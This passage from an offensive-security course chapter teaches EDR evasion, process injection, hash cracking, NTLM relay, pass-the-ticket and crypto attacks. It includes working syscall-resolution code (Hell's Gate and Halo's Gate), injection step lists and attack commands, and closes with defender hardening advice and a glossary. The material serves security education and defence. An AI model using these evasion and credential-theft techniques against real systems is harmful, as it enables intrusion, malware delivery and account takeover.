**Module stomping**: Load a legitimate DLL, then overwrite its `.text`
section with your shellcode. Memory scanners see a loaded DLL at that
address — it looks normal. The content is your code.

**Manual DLL mapping**: Map a DLL into memory manually without using
`LoadLibrary`. This avoids the DLL appearing in the PEB's loaded
module list. EDR tools that enumerate loaded modules won't see it.

---

## Modern Evasion Techniques

### Direct Syscalls — Bypass ntdll.dll Hooks

When your code calls `VirtualAlloc`, the call chain is:
```
Your code → kernel32.dll!VirtualAlloc → ntdll.dll!NtAllocateVirtualMemory → syscall → kernel
```

EDR products hook ntdll.dll functions — they replace the first
instructions with a `JMP` to their monitoring code. Every call through
ntdll passes through the EDR's hooks first.

**Direct syscalls skip ntdll entirely**:
```
Your code → syscall instruction (inline assembly) → kernel
```

No ntdll, no hooks, no EDR visibility.

```nasm
; Direct syscall for NtAllocateVirtualMemory (Windows 10 21H2)
; Syscall number (SSN) = 0x18
mov r10, rcx        ; Windows syscall convention: first arg goes in r10 (not rcx)
mov eax, 0x18       ; syscall number for NtAllocateVirtualMemory — hardcoded here
syscall             ; jump directly to kernel — bypasses ntdll entirely
ret                 ; return to caller
```

**The problem**: Syscall numbers change between Windows versions. The
SSN for `NtAllocateVirtualMemory` might be 0x18 on one build and 0x1A
on another. You need to resolve the correct SSN at runtime.

### Hell's Gate — Dynamic SSN Resolution

Hell's Gate reads the SSN directly from the ntdll.dll image in memory:

```c
// Simplified Hell's Gate concept
// NtAllocateVirtualMemory in ntdll starts with:
//   4c 8b d1     mov r10, rcx
//   b8 XX 00 00 00  mov eax, <SSN>   ← XX is the syscall number we want
//   ...
//   0f 05        syscall
//   c3           ret

// If it starts with 4c 8b d1 b8 → unhooked, SSN is the byte after b8
// If it starts with e9 (JMP) → the function is HOOKED by EDR

DWORD get_ssn(FARPROC func_addr) {
    BYTE* bytes = (BYTE*)func_addr;   // treat the function address as a byte array
    // Check if function is hooked (EDR JMP patch — 0xe9 = JMP opcode)
    if (bytes[0] == 0xe9) {
        // Function is hooked — Hell's Gate fails here
        // Need Halo's Gate or another technique
        return 0;
    }
    // Unhooked: check for expected prologue bytes and extract SSN
    // 4c 8b d1 = mov r10, rcx | b8 = start of mov eax, imm32
    if (bytes[0] == 0x4c && bytes[1] == 0x8b && bytes[2] == 0xd1 &&
        bytes[3] == 0xb8) {
        return *(DWORD*)(bytes + 4);  // the 4 bytes starting at offset 4 are the SSN
    }
    return 0;  // unrecognized prologue — can't extract SSN
}
```

### Halo's Gate — When Hell's Gate Fails

If the target function IS hooked (starts with JMP instead of the
expected prologue), Halo's Gate looks at NEIGHBORING functions. SSNs
are sequential — if `NtAllocateVirtualMemory` has SSN 0x18, the
function above it in ntdll's export table has SSN 0x17 and the one
below has SSN 0x19.

```c
// Halo's Gate: if target function is hooked, check neighbors to infer our SSN
DWORD halos_gate(FARPROC func_addr, DWORD func_index_in_table) {
    BYTE* bytes = (BYTE*)func_addr;

    // If not hooked, use Hell's Gate directly
    if (bytes[0] == 0x4c && bytes[3] == 0xb8)
        return *(DWORD*)(bytes + 4);  // unhooked — read SSN directly

    // Check function ABOVE and BELOW in memory
    // SSN is sequential: neighbor_ssn ± offset = our SSN
    for (int offset = 1; offset < 500; offset++) {
        BYTE* neighbor_up = bytes - (offset * 32);    // function above (stubs are ~32 bytes)
        if (neighbor_up[0] == 0x4c && neighbor_up[3] == 0xb8) {
            // Found unhooked neighbor above — our SSN = neighbor's SSN + offset
            return *(DWORD*)(neighbor_up + 4) + offset;
        }
        BYTE* neighbor_down = bytes + (offset * 32);  // function below
        if (neighbor_down[0] == 0x4c && neighbor_down[3] == 0xb8) {
            // Found unhooked neighbor below — our SSN = neighbor's SSN - offset
            return *(DWORD*)(neighbor_down + 4) - offset;
        }
    }
    return 0;  // couldn't find any unhooked neighbor within 500 stubs
}
```

### Indirect Syscalls

Direct syscalls have a telltale sign: the `syscall` instruction
executes from your module's memory range, not from ntdll.dll. EDR can
detect this by checking the return address on the stack.

**Indirect syscalls**: Instead of executing `syscall` in your own code,
find the `syscall; ret` gadget inside ntdll.dll and JMP to it. The
`syscall` instruction executes from ntdll's address range — exactly
where it's expected to be. But you set up the registers yourself,
skipping the hooked prologue.

```nasm
; Indirect syscall pattern:
; 1. Resolve SSN (Hell's Gate / Halo's Gate)
; 2. Find 'syscall; ret' gadget in ntdll (scan ntdll .text for 0f 05 c3)
; 3. Set up registers as if ntdll did it
; 4. JMP to the gadget — syscall executes FROM ntdll's memory range

mov r10, rcx                          ; syscall calling convention
mov eax, 0x18                         ; SSN resolved at runtime
jmp qword ptr [syscall_gadget]        ; JMP into ntdll — 'syscall; ret' is there
; Stack return address points back to ntdll — EDR sees nothing unusual
```

### Module Stomping

Instead of allocating new memory (which EDR monitors), overwrite an
existing legitimate DLL's code section:

1. Load a benign DLL with `LoadLibrary` (e.g., `amsi.dll`, `xpsprint.dll`)
2. Find its `.text` section
3. Change permissions to RW
4. Overwrite with your shellcode
5. Change permissions back to RX
6. Execute

Memory scanners see a legitimate module loaded at that address. The
module's file on disk matches the PE headers. The `.text` content
doesn't match — but not every scanner checks this, and the ones that
do need to read from disk and compare byte-by-byte.

### Process Hollowing

Create a suspended legitimate process, hollow out its memory, replace
it with your payload, resume execution. The process looks legitimate
in Task Manager, running from a trusted path.

```
1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
2. NtUnmapViewOfSection(process, base_address)      // hollow it out — unmap original image
3. VirtualAllocEx(process, base_address, ...)        // allocate space for our PE
4. WriteProcessMemory(process, base_address, payload, ...)  // write our PE into it
5. SetThreadContext(thread, ...)                      // redirect entry point to our code
6. ResumeThread(thread)                              // let it run — our code executes
```

From the outside: `svchost.exe` running from `C:\Windows\System32\`.
Inside: your payload. EDR detects this by checking if the in-memory
image matches the on-disk file — but the detection isn't perfect,
especially with variations (process doppelganging, process herpaderping,
transacted hollowing).

### Early Bird Injection

A variant of APC injection that fires before EDR's userland hooks are
initialized:

1. Create a suspended process
2. Allocate and write shellcode into its memory
3. Queue an APC (Asynchronous Procedure Call) to the main thread
4. Resume the thread

The APC fires when the thread enters an alertable wait state — which
happens during process initialization, BEFORE the EDR's DLL gets
loaded and hooks are placed. Your code runs in a window where no hooks
exist yet.

### Thread Execution Hijack

Instead of creating a new thread (which EDR monitors), hijack an
existing one:

1. Find a running thread in the target process
2. `SuspendThread(thread)`
3. `GetThreadContext(thread, &ctx)` — save current state
4. `ctx.Rip = shellcode_address` — point instruction pointer to shellcode
5. `SetThreadContext(thread, &ctx)` — apply modified context
6. `ResumeThread(thread)` — thread now executes your shellcode

No new thread created. No `CreateRemoteThread` call. The existing
thread just "happens" to execute different code after being briefly
suspended.

---

## Hash Cracking

Post-exploitation credential access. You've dumped hashes from LSASS,
SAM, NTDS.dit, or captured them with Responder. Now you need plaintext
passwords (or sometimes just the hashes themselves — pass-the-hash).

### Hash Types You'll Encounter

```
# NTLM (from SAM or LSASS dump)
# Format: username:RID:LM_hash:NT_hash:::
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Hashcat mode: -m 1000

# Net-NTLMv2 (from Responder capture)
# Format: user::domain:challenge:response:blob
admin::CORP:1122334455667788:A1B2C3...:0101000000000000...
# Hashcat mode: -m 5600

# Kerberoast (TGS-REP encrypted with service account password)
# Format: $krb5tgs$23$*user$realm$service...*$hash
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*$a1b2c3...
# Hashcat mode: -m 13100

# AS-REP Roast (for accounts with "Do not require Kerberos pre-auth")
# Format: $krb5asrep$23$user@realm:hash
$krb5asrep$23$jsmith@CORP.LOCAL:a1b2c3...
# Hashcat mode: -m 18200

# Linux shadow (SHA-512)
# Format: $6$salt$hash
$6$rounds=5000$saltsalt$hash...
# Hashcat mode: -m 1800
```

### Hashcat — GPU-Accelerated Cracking

```bash
# Basic dictionary attack — try every word in rockyou.txt as the password
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (applies transformations to each word — adds numbers, swaps case, etc.)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common rule files:
#   best64.rule     — 64 most effective rules, fast
#   rockyou-30000.rule — aggressive, 30000 transformations per word
#   d3ad0ne.rule    — large ruleset
#   OneRuleToRuleThemAll.rule — community favorite
#   dive.rule       — comprehensive

# Mask attack (brute force with pattern)
# ?l = lowercase letter, ?u = uppercase, ?d = digit, ?s = special char
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?d?d   # matches: Password12 pattern
hashcat -m 1000 hash.txt -a 3 ?d?d?d?d?d?d?d?d    # matches: 8-digit PIN (12345678)

# Hybrid: dictionary + mask
hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d  # word + 4 digits (password1234)
hashcat -m 1000 hash.txt -a 7 ?d?d?d?d rockyou.txt  # 4 digits + word (1234password)

# Kerberoast cracking
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

# Show cracked passwords (after the attack finishes)
hashcat -m 1000 hash.txt --show

# Performance stats — see how fast your GPU cracks each hash type
hashcat -b   # benchmark all modes
```

### Expected Output

**Successful crack:**
```
31d6cfe0d16ae931b73c59d7e0c089c0:<empty>   (empty password)
-- or --
aabbcc...:<cracked_password>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
```

**Failure looks like `No hashes loaded` — check your hash file format. NTLM should be just the hash, one per line: `31d6cfe0d16ae931b73c59d7e0c089c0`**

**Failure looks like `No devices found/left` — hashcat can't find your GPU. Run `hashcat -I` to see detected devices. On Windows with NVIDIA, ensure CUDA drivers are installed.**

---

### John the Ripper

```bash
# Basic attack — John auto-detects hash type
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules (John has its own rule syntax)
john --wordlist=rockyou.txt --rules=jumbo hashes.txt

# Specify hash format explicitly
john --format=nt hashes.txt              # NTLM
john --format=netntlmv2 hashes.txt      # Net-NTLMv2
john --format=krb5tgs hashes.txt        # Kerberoast

# Show cracked passwords
john --show hashes.txt

# Create custom rules in john.conf:
# [List.Rules:custom]
# Az"[0-9][0-9][0-9]"    # append 3 digits
# c                        # capitalize first letter
# $[!@#$%]                # append special char
```

### Expected Output

**Successful crack:**
```
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
password123      (Administrator)
1g 0:00:00:02 DONE (2026-01-01 12:00) ...
```

**Failure looks like `No password hashes loaded` — John didn't recognise the format. Add `--format=nt` explicitly for NTLM hashes.**

**Failure looks like `0 password hashes cracked, 1 left` after rockyou finishes — the password isn't in the list. Try a different wordlist or switch to hashcat with rules.**

---

### When To Crack vs When To Relay

**Crack** when you need the plaintext (for password reuse across systems,
for services that require plaintext, for offline access).

**Relay** when time matters. NTLM relay (with ntlmrelayx) forwards the
authentication attempt to another server in real-time. No cracking
needed. The victim authenticates to you, you forward that authentication
to the target. If the victim has admin rights on the target — you win.

```bash
# NTLM relay with impacket (WSL2 or Linux)
ntlmrelayx.py -t <target_ip> -smb2support  # relay to SMB on target

# Relay to multiple targets from a list
ntlmrelayx.py -tf targets.txt -smb2support

# Relay and execute a command on the target
ntlmrelayx.py -t <target> -smb2support -c "whoami"

# Relay to LDAP (for adding a machine account, modifying ACLs — AD attack path)
ntlmrelayx.py -t ldaps://<dc_ip> --add-computer
```

### Expected Output

**Successful relay:**
```
[*] Servers started, waiting for connections
[*] SMBD: Received connection from <victim_ip>
[*] Authenticating against smb://<target_ip> as DOMAIN\user SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootkey: ...
```

**Failure looks like `STATUS_ACCESS_DENIED` — the relayed user doesn't have admin rights on the target. Try a different target or wait for a higher-privilege user to authenticate.**

---

## Crypto Attacks — Know They Exist

You're not going to implement these from scratch (probably). But you
need to recognize when they apply and know how to use the tools.

### Padding Oracle Attack (CBC Mode)

CBC decryption XORs each decrypted block with the previous ciphertext
block. If the server tells you whether the PADDING is valid (even
indirectly — different error codes, different response times), you can
decrypt the entire ciphertext one byte at a time without knowing the key.

```
How it works (simplified):
1. Modify the last byte of the second-to-last ciphertext block
2. Send to server
3. Server decrypts → checks padding → reports valid or invalid
4. By trying all 256 values, you find the one that produces valid padding
5. This tells you the plaintext byte (XOR math)
6. Repeat for every byte in every block
```

**Tools**: `PadBuster` automates this. It's slow (up to 256 requests
per byte) but it works against any application that leaks padding
validity.

```bash
# PadBuster example (run inside WSL2)
# padbuster sends modified requests and watches for padding error vs other errors
padbuster <target_url> <encrypted_cookie> <block_size> -cookies "auth=<value>"
```

### Expected Output

```
[+] Decrypting Bytes
[+] Block 1 Results:
    [+] Cipher Text (HEX): ...
    [+] Intermediate Bytes (HEX): ...
    [+] Plain Text: username=admin
```

**Failure looks like `[ERROR] All of the responses were the same length` — the server isn't leaking padding validity through response size. Try checking response time (`-usebody`) or error message content (`-error`).**

---

**Where you'll see this**: Encrypted cookies, encrypted URL parameters,
any application using CBC mode where the server's error behavior differs
based on padding validity. ASP.NET had a famous padding oracle
vulnerability (CVE-2010-3332).

### Downgrade Attacks

Force a connection to use a weaker protocol version or cipher suite.

**TLS downgrade**: Intercept the TLS handshake and modify the
ClientHello to remove strong cipher suites. The server falls back to
a weaker cipher that you can break. POODLE (CVE-2014-3566) attacked
SSLv3 this way. Modern TLS 1.3 eliminates most downgrade paths.

**NTLM downgrade**: Force NTLMv1 authentication instead of NTLMv2.
NTLMv1 hashes are crackable with rainbow tables. Modify the
`LmCompatibilityLevel` on a compromised server, or use a rogue server
that requests NTLMv1.

**Kerberos downgrade**: Request RC4 encryption for Kerberos tickets
instead of AES. RC4-encrypted tickets are crackable. This is the
basis of Kerberoasting — you request a TGS for a service account and
specify RC4 encryption type. The DC obliges, and now you have a hash
you can crack offline.

### Replay Attacks

Capture a valid authentication exchange and replay it later. The server
sees valid credentials and grants access.

**Where replay works**: Protocols without timestamps, nonces, or sequence
numbers in their authentication. Kerberos tickets can be replayed
within their validity window (typically 10 hours). NTLM challenges
include a timestamp but the window is usually 30 minutes.

**Pass-the-Ticket**: Export a Kerberos TGT from one machine, import it
on another. You're "replaying" the ticket. The KDC doesn't know or care
which machine presents it.

```bash
# Export TGT from compromised machine (Mimikatz)
sekurlsa::tickets /export  # dumps all Kerberos tickets to .kirbi files

# Import on attacker machine (Rubeus)
Rubeus.exe ptt /ticket:ticket.kirbi  # inject ticket into current session

# Now you have the user's Kerberos identity
# All network access uses their credentials
```

### Hash Length Extension

If a server computes `HMAC = H(secret || message)` using a
Merkle-Damgard hash (MD5, SHA-1, SHA-256), you can EXTEND the hash
without knowing the secret. You append data to the message and compute
a valid hash for the extended message.

**Where you'll see it**: Custom authentication schemes that concatenate
a secret key with user-controlled data before hashing. The fix is to
use HMAC (which double-hashes with the key) instead of raw
`H(key || data)`.

```bash
# hash_extender tool (WSL2)
# --data = original message | --append = data to add | --signature = original hash
hash_extender --data "original_data" --secret-min 10 --secret-max 30 \
    --append "admin=true" --signature <original_hash> --format sha256
```

---

## Putting It Together — The Evasion Pipeline

Real-world payload delivery isn't one technique — it's a pipeline.
Each stage strips away one detection layer:

```
Stage 0: Raw shellcode (msfvenom, custom, Cobalt Strike)
   ↓ Caught by: everything
Stage 1: AES-encrypt the shellcode
   ↓ Defeats: static signature matching
Stage 2: Build loader with API obfuscation + dynamic resolution
   ↓ Defeats: string-based heuristics
Stage 3: Add environment checks (sandbox detection)
   ↓ Defeats: automated sandbox analysis
Stage 4: Use direct/indirect syscalls for memory operations
   ↓ Defeats: ntdll.dll API hooking (EDR userland hooks)
Stage 5: Execute via callback or thread hijack
   ↓ Defeats: CreateThread-based behavioral detection
Stage 6: Encrypt payload in memory during sleep cycles
   ↓ Defeats: memory scanning
Stage 7: C2 over HTTPS with malleable profile
   ↓ Defeats: network traffic analysis

Result: Payload executes on a modern, fully-patched Windows endpoint
with up-to-date EDR. Not guaranteed — but each stage multiplies the
difficulty for defenders.
```

**The arms race is real**: Defenders adapt. Every technique has a
detection method. Direct syscalls? EDR monitors at the kernel level
with ETW (Event Tracing for Windows). Callback execution? They
enumerate callback registrations. Module stomping? They compare
in-memory images to on-disk files. Encrypted sleep? They periodically
dump and scan between encryption cycles.

There is no permanent bypass. There is only the current gap between
what you do and what they check. Your job is to stay ahead of that
gap — not by learning one trick, but by understanding the MECHANISMS
well enough to improvise when the playbook stops working.

---

## DEFENDER TAKEAWAY

You now know exactly what attackers do. Here's what to do with that knowledge on Monday morning.

- **Enforce NTLMv2 minimum and disable NTLMv1.** Open Group Policy: `Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Network Security: LAN Manager authentication level`. Set to "Send NTLMv2 response only. Refuse LM & NTLM." This kills NTLM downgrade attacks and NTLMv1 rainbow-table cracking in one policy change.

- **Enable Windows Defender Credential Guard.** This isolates LSASS in a hardware-protected enclave. Mimikatz can't dump hashes from LSASS if Credential Guard is running. Policy path: `Computer Configuration → Administrative Templates → System → Device Guard → Turn on Virtualization Based Security`. Requires UEFI + Secure Boot.

- **Monitor Event ID 4625 (failed logon) and 4648 (logon with explicit credentials) in bulk.** Pass-the-Hash and pass-the-ticket attacks generate logon events with `Logon Type 3` (network) from unusual source machines. A spike in 4625 from a single source IP is a spray attack. Alert on it. Configure in Windows Event Forwarding or your SIEM.

- **Audit Event ID 4688 (new process creation) with command line logging enabled.** Enable via `Computer Configuration → Administrative Templates → System → Audit Process Creation → Include command line in process creation events`. This catches `powershell -enc ...` and `wscript ...` one-liners that attackers use for initial execution. Command lines are logged in full.

- **Block PowerShell -EncodedCommand execution in Constrained Language Mode.** Enforce PowerShell Constrained Language Mode via AppLocker or Windows Defender Application Control (WDAC). This doesn't stop all PowerShell abuse but eliminates the dumbest 80% of it. Set `__PSLockdownPolicy` or configure a WDAC policy.

- **Deploy memory integrity (HVCI — Hypervisor-Protected Code Integrity).** HVCI prevents unsigned kernel drivers and makes kernel-level EDR hooks harder to bypass. Enable in Windows Security → Device Security → Core isolation → Memory integrity. Note: may break older device drivers — test first.

- **Hunt for process hollowing with Event ID 10 (process access) in Sysmon.** Install Sysmon (free, Microsoft Sysinternals) with a config that logs `ProcessAccess` events. Hollowing requires `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext` on a remote process. Sysmon logs the access rights requested — `0x1F0FFF` (all access) on `svchost.exe` from a non-system process is a red flag.

- **Rotate service account passwords frequently and audit Kerberoastable accounts.** Run `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` to find Kerberoastable accounts. Any service account SPN that an attacker can request a TGS for is a cracking target. Use 30+ character random passwords for service accounts, or migrate to gMSA (Group Managed Service Accounts) which rotate automatically.

---

## Summary — Key Takeaways

- **Encoding is not encryption.** Base64, hex, URL encoding — all
  reversible without a key. Defender decodes base64 trivially. Never
  rely on encoding for evasion.

- **XOR with a short key is broken.** Defender XOR-decrypts with common
  key lengths and checks results against signatures. AES with a random
  key per payload is the minimum standard for payload encryption.

- **NTLM hashes are as good as passwords.** Pass-the-hash, pass-the-ticket,
  and relay attacks mean you often don't need to crack anything. The hash
  or ticket IS the credential.

- **Static evasion is the easy part.** Encrypt the payload and signatures
  can't match. The hard part is behavioral and heuristic evasion —
  changing HOW your code executes so it doesn't trigger pattern-based
  detection.

- **Direct syscalls bypass userland hooks.** EDR hooks ntdll.dll. Direct
  syscalls skip ntdll entirely. Indirect syscalls do the same while hiding
  the fact that you're making direct syscalls. Hell's Gate and Halo's Gate
  resolve SSNs at runtime.

- **The evasion pipeline is layered.** No single technique defeats all
  detection. Stack encryption + obfuscation + sandbox detection + syscalls +
  alternative execution + memory encryption + encrypted C2. Each layer
  defeats one detection mechanism.

- **Process injection has many forms.** Process hollowing, early bird,
  thread hijack, module stomping, callback execution — each has different
  detection signatures. Knowing multiple techniques means you can rotate
  when one gets caught.

- **Hash cracking is a GPU problem.** NTLM cracks at billions per second
  on modern GPUs. NTLMv2 and Kerberoast hashes are slower but still
  crackable with good wordlists and rules. Know your hashcat modes.

- **Crypto attacks exist at the protocol level.** Padding oracles,
  downgrade attacks, replay attacks, hash length extension. You won't
  implement these often, but you need to recognize when a target is
  vulnerable to them.

- **There is no permanent bypass.** The arms race between offense and
  defense is continuous. Understanding the MECHANISMS — not just the
  techniques — is what lets you adapt when the current playbook gets
  burned.

---

## Key Terms

| Term | Definition |
|------|-----------|
| AES-CBC | Advanced Encryption Standard in Cipher Block Chaining mode. Industry-standard symmetric cipher. Each block XOR'd with previous ciphertext before encryption. |
| RC4 | Stream cipher. Generates a keystream from a key, XORs with plaintext. Simple to implement, adequate for payload obfuscation. |
| XOR cipher | Bitwise XOR operation with a key. Reversible — same operation encrypts and decrypts. Weak with short keys. |
| IV (Initialization Vector) | Random bytes used to seed the first block in CBC mode. Must be unique per encryption. Transmitted alongside ciphertext, not a secret. |
| PKCS7 padding | Padding scheme that fills the last block to a multiple of the block size. Byte value = number of padding bytes added. |
| NTLM hash | Windows password hash: MD4(UTF-16LE(password)). No salt. Usable directly for pass-the-hash authentication. |
| Pass-the-Hash | Authenticating to Windows using an NTLM hash directly, without knowing the plaintext password. |
| Pass-the-Ticket | Injecting a stolen Kerberos TGT or TGS into the current session to assume that user's identity. |
| Kerberoasting | Requesting a TGS-REP for a service account SPN, extracting the RC4-encrypted ticket, cracking it offline. |
| Direct syscall | Invoking kernel functions with an inline `syscall` instruction, bypassing ntdll.dll and its EDR hooks. |
| SSN (Syscall Service Number) | The number that identifies a specific kernel function. Changes between Windows builds. |
| Hell's Gate | Technique to read the SSN from ntdll's in-memory function bytes. Fails if the function is hooked. |
| Halo's Gate | Extension of Hell's Gate that infers the SSN from neighboring unhooked functions when the target is hooked. |
| Indirect syscall | Direct syscall variant where the `syscall; ret` gadget is borrowed from ntdll's address range, hiding the true call origin. |
| Process hollowing | Creating a suspended legitimate process, replacing its memory with a payload, resuming execution under the legitimate process name. |
| Module stomping | Overwriting a loaded legitimate DLL's code section with shellcode so memory scanners see a trusted module name at that address. |
| Early Bird injection | APC injection technique that fires before EDR hooks are initialized, during the target process's startup. |
| Thread execution hijack | Redirecting an existing thread's instruction pointer to shellcode without creating a new thread. |
| Padding oracle attack | Attack on CBC encryption where server error behavior leaks padding validity, enabling full decryption without the key. |
| NTLM relay | Forwarding a victim's NTLM authentication in real-time to a different target, gaining access without cracking. |
| Hashcat | GPU-accelerated password hash cracker. Supports dictionary, mask, hybrid, and rule-based attacks. |
| pycryptodome | Python cryptography library. Install with `pip install pycryptodome`. Provides `Crypto.*` namespace. |
| ETW (Event Tracing for Windows) | Windows kernel telemetry subsystem. EDR uses ETW to monitor system calls even when ntdll hooks are bypassed. |
| AMSI (Antimalware Scan Interface) | Windows API that lets AV engines scan script content (PowerShell, VBScript, JScript) before execution. Decodes base64 automatically. |
